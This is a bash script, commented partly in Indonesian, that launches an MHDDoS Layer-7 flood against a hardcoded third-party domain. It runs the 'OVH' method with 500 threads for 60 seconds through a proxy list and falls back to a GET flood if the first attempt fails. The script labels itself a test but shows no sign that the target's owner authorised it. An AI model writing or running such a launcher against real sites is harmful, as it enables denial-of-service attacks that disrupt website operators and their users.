#!/bin/bash

# ============================================
# SIMPLE OVH ATTACK TEST SCRIPT
# Bypass semua menu, langsung attack dengan OVH method
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}============================================${NC}"
echo -e "${YELLOW}💀 OVH ATTACK TEST - SIMPLE DIRECT TEST${NC}"
echo -e "${BLUE}============================================${NC}"

# Set parameters directly
TARGET="https://citra.faaruq.com"
METHOD="OVH"
DURATION=60
THREADS=500

echo -e "${GREEN}🎯 Target: $TARGET${NC}"
echo -e "${GREEN}⚡ Method: $METHOD${NC}"
echo -e "${GREEN}⏱️  Duration: ${DURATION}s${NC}"
echo -e "${GREEN}🧵 Threads: $THREADS${NC}"

# Setup MHDDoS
cd MHDDoS

# Check venv
if [ -d "venv" ] && [ -f "venv/bin/activate" ]; then
    source venv/bin/activate
    echo -e "${GREEN}✅ Venv activated${NC}"
elif [ -d "/home/mzkyzak/Dokumen/Hack-camera/MHDDoS/venv" ] && [ -f "/home/mzkyzak/Dokumen/Hack-camera/MHDDoS/venv/bin/activate" ]; then
    source "/home/mzkyzak/Dokumen/Hack-camera/MHDDoS/venv/bin/activate"
    echo -e "${GREEN}✅ Venv activated (Dokumen dir)${NC}"
else
    echo -e "${YELLOW}⚠️  Using system Python${NC}"
fi

# Check proxy file
PROXY_FILE="files/proxies/http.txt"
if [ ! -f "$PROXY_FILE" ]; then
    mkdir -p files/proxies
    echo "# Test proxy" > "$PROXY_FILE"
    echo "127.0.0.1:8080" >> "$PROXY_FILE"
    echo -e "${YELLOW}⚠️  Created default proxy file${NC}"
fi

# Build attack command
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}🚀 Launching OVH attack...${NC}"

# Layer7 attack format: METHOD URL SOCKS_TYPE THREADS PROXY_LIST RPC DURATION
ATTACK_CMD="timeout ${DURATION}s python start.py $METHOD '$TARGET' 0 $THREADS '$PROXY_FILE' 10 $DURATION"
echo -e "${CYAN}Command: $ATTACK_CMD${NC}"

echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

# Run attack
eval "$ATTACK_CMD" &
ATTACK_PID=$!

sleep 3

if ps -p $ATTACK_PID > /dev/null 2>&1; then
    echo -e "${GREEN}✅ OVH attack started! PID: $ATTACK_PID${NC}"
    echo -e "${YELLOW}📊 Attack running for $DURATION seconds...${NC}"
    
    # Wait for attack to complete
    echo -e "${CYAN}Press Ctrl+C to stop attack early...${NC}"
    wait $ATTACK_PID 2>/dev/null
    
    echo -e "${GREEN}✅ Attack completed!${NC}"
else
    echo -e "${RED}❌ Attack failed to start${NC}"
    
    # Try alternative method
    echo -e "${YELLOW}🔄 Trying alternative method...${NC}"
    ATTACK_CMD="timeout ${DURATION}s python start.py GET '$TARGET' 0 $THREADS '$PROXY_FILE' 10 $DURATION"
    eval "$ATTACK_CMD" &
    ALT_PID=$!
    sleep 2
    
    if ps -p $ALT_PID > /dev/null 2>&1; then
        echo -e "${GREEN}✅ GET attack started as fallback${NC}"
        wait $ALT_PID 2>/dev/null
    fi
fi

cd ..
echo -e "${BLUE}============================================${NC}"
echo -e "${GREEN}🎯 TEST COMPLETE!${NC}"
echo -e "${BLUE}============================================${NC}"